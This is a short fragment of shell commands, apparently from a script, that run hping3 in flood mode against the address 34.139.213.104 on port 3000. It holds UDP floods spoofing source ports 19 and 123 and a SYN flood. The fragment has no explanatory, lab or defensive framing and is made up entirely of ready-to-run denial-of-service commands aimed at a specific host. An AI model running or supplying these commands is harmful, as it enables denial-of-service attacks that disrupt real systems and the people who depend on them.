...
/usr/sbin/hping3 -n --flood --udp -s 19 --keep -p 3000 34.139.213.104
EOF
...
/usr/sbin/hping3 -n --flood --udp -s 123 --keep -p 3000 34.139.213.104
EOF
...
/usr/sbin/hping3 -n --flood -S -p 3000 34.139.213.104
EOF
